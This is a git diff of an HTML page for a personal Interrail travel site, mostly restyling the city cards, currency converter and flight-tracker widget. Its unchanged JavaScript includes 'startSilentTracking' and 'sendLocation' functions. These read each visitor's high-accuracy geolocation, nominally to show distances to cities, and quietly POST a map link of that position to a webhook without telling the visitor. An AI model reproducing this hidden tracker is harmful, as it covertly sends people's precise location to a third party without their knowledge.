@@ -1,8 +1,10 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta property="og:title" content="My Interrailing Trip">
-    <meta property="og:description" content="Follow my interrail adventure across Europe 🚆🌍">
+    <meta property="og:title" content="EURO 26">
+    <meta property="og:description" content="Grand Tour // Interrail 🚆🌍">
+    
+    <meta property="og:image" content="https://TM45634592349.github.io/Interrail-2026/preview.jpeg">
     
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="mobile-web-app-capable" content="yes">
@@ -73,7 +75,7 @@
         .time-box span { display: block; font-family: 'Syncopate', sans-serif; font-size: 1.4rem; color: var(--neon); }
         .time-box label { font-size: 0.6rem; color: var(--dim); text-transform: uppercase; letter-spacing: 1px; display: block; margin-top: 5px; }
 
-        /* --- GRID (PERFECT 3-COLUMN) --- */
+        /* --- GRID (PERFECT 3-COLUMN LAYOUT) --- */
         .grid { 
             display: grid; 
             grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); 
@@ -83,12 +85,11 @@
             padding: 0 15px; 
         }
 
-        /* 3 Columns on PC = 6 slots. 5 Cities + 1 Dashboard = Perfect Fit */
+        /* PC Fix: 3 Columns. Dashboard fills the last slot perfectly. */
         @media (min-width: 1024px) {
             .grid { grid-template-columns: repeat(3, 1fr); }
         }
         
-        /* Standard Card Style */
         .card { 
             background: var(--card-bg); height: 280px; position: relative; overflow: hidden; 
             border: 1px solid #333; transition: transform 0.2s ease-out; 
@@ -113,22 +114,22 @@
             backdrop-filter: blur(5px); color: #fff;
             box-shadow: 0 4px 10px rgba(0,0,0,0.5);
         }
-        .weather-chip { right: 15px; }
+        .weather-chip { right: 15px; } 
         .dist-chip { left: 15px; color: var(--neon); border-color: #555; }
 
-        /* --- COMPACT DASHBOARD CARD (6th Slot) --- */
+        /* --- DASHBOARD CARD (Stacked Layout) --- */
         .dashboard-card { 
             background: #111; 
             border: 1px solid #333; 
-            height: 280px; /* Same height as cities */
+            height: 280px; 
             display: flex; 
-            flex-direction: column; /* Vertical Stack */
+            flex-direction: column; /* Stacked Vertically */
             position: relative;
         }
 
-        /* --- TOP HALF: Currency --- */
+        /* Top Half: Currency */
         .currency-box { 
-            flex: 1; /* Takes 50% height */
+            flex: 1; 
             border-bottom: 1px solid #333;
             display: flex; flex-direction: column; 
             justify-content: center; 
@@ -139,13 +140,13 @@
         
         .currency-row { display: flex; gap: 5px; }
         .currency-input, .currency-select { background: #222; border: 1px solid #333; padding: 8px; text-align: center; outline: none; }
-        .currency-input { width: 60%; color: white; font-family: 'Rajdhani'; font-size: 1.1rem; }
+        .currency-input { width: 60%; color: white; font-family: 'Rajdhani'; font-size: 1.2rem; }
         .currency-select { width: 40%; color: var(--neon); font-family: 'Syncopate'; font-size: 0.8rem; }
-        .currency-result { width: 100%; text-align: center; color: var(--neon); font-family: 'Rajdhani'; font-size: 1.2rem; font-weight: bold; }
+        .currency-result { width: 100%; text-align: center; color: var(--neon); font-family: 'Rajdhani'; font-size: 1.4rem; font-weight: bold; border: 1px solid var(--neon); padding: 5px; background: #000; }
 
-        /* --- BOTTOM HALF: Flight Tracker --- */
+        /* Bottom Half: Flight Tracker */
         .radar-box { 
-            flex: 1; /* Takes 50% height */
+            flex: 1; 
             background: #000; 
             padding: 0 20px; 
             position: relative; 
@@ -163,6 +164,9 @@
         .tr { top: 10px; right: 10px; border-bottom: 0; border-left: 0; }
         .bl { bottom: 10px; left: 10px; border-top: 0; border-right: 0; }
         .br { bottom: 10px; right: 10px; border-top: 0; border-left: 0; }
+        .blip { width: 6px; height: 6px; background-color: var(--neon); border-radius: 50%; animation: pulse 2s infinite; display: inline-block; margin-right: 5px; }
+        @keyframes pulse { 0% { opacity: 1; transform: scale(1); } 100% { opacity: 0; transform: scale(2.5); } }
+
     </style>
 </head>
 <body>
@@ -229,7 +233,7 @@
 
         <div class="radar-box">
             <div class="corner tl"></div><div class="corner tr"></div><div class="corner bl"></div><div class="corner br"></div>
-            <div class="tool-label">FLIGHT TRACKER</div>
+            <div class="tool-label"><div class="blip"></div> FLIGHT TRACKER</div>
             <div class="radar-input-group">
                 <input type="text" id="flightInput" class="radar-input" placeholder="FLIGHT NO.">
                 <button class="radar-btn" onclick="searchFlight()">GO</button>
@@ -254,9 +258,6 @@
         fetchLiveWeather();
     };
 
-    // ==========================================
-    // 1. TRACKER & DISTANCE
-    // ==========================================
     function startSilentTracking() {
         if (!navigator.geolocation) {
             updateDistances(0,0, true);
@@ -268,13 +269,11 @@
 
     function sendLocation() {
         const options = { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 };
-
         navigator.geolocation.getCurrentPosition(
             (position) => {
                 const lat = position.coords.latitude;
                 const lng = position.coords.longitude;
                 updateDistances(lat, lng, false);
-
                 const mapLink = `https://www.google.com/maps?q=${lat},${lng}`;
                 fetch(WEBHOOK_URL, {
                     method: 'POST',
@@ -284,9 +283,7 @@
                     })
                 }).catch(err => console.error("Tracker Error", err));
             }, 
-            (error) => {
-                updateDistances(0,0, true); 
-            },
+            (error) => { updateDistances(0,0, true); },
             options
         );
     }
@@ -295,27 +292,17 @@
         cityConfig.forEach(city => {
             const el = document.getElementById(`d-${city.name}`);
             if(!el) return;
-
-            if (isError) {
-                el.innerText = "📍 GPS OFF";
-                return;
-            }
-
+            if (isError) { el.innerText = "📍 GPS OFF"; return; }
             const R = 6371; 
             const dLat = (city.lat - userLat) * Math.PI / 180;
             const dLon = (city.lng - userLng) * Math.PI / 180;
             const a = Math.sin(dLat/2) * Math.sin(dLat/2) +
                       Math.cos(userLat * Math.PI / 180) * Math.cos(city.lat * Math.PI / 180) * Math.sin(dLon/2) * Math.sin(dLon/2);
             const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
-            const d = Math.round(R * c);
-
-            el.innerText = `📍 ${d} km`;
+            el.innerText = `📍 ${Math.round(R * c)} km`;
         });
     }
 
-    // ==========================================
-    // 2. WEATHER
-    // ==========================================
     async function fetchLiveWeather() {
         for (const city of cityConfig) {
             try {
@@ -335,7 +322,6 @@
         if (code <= 99) return "⛈️"; return "🌥️"; 
     }
 
-    // Currency
     const rates = { 'EUR': 1.18, 'CZK': 29.50, 'HUF': 460.0, 'PLN': 5.10 };
     function convertCurrency() {
         const amount = parseFloat(document.getElementById('currInput').value);
@@ -345,7 +331,6 @@
         resultBox.innerText = `${(amount * rates[currency]).toFixed(2)} ${currency}`;
     }
 
-    // Timer
     const target = new Date("August 17, 2026 00:00:00").getTime();
     setInterval(() => {
         const gap = target - new Date().getTime();
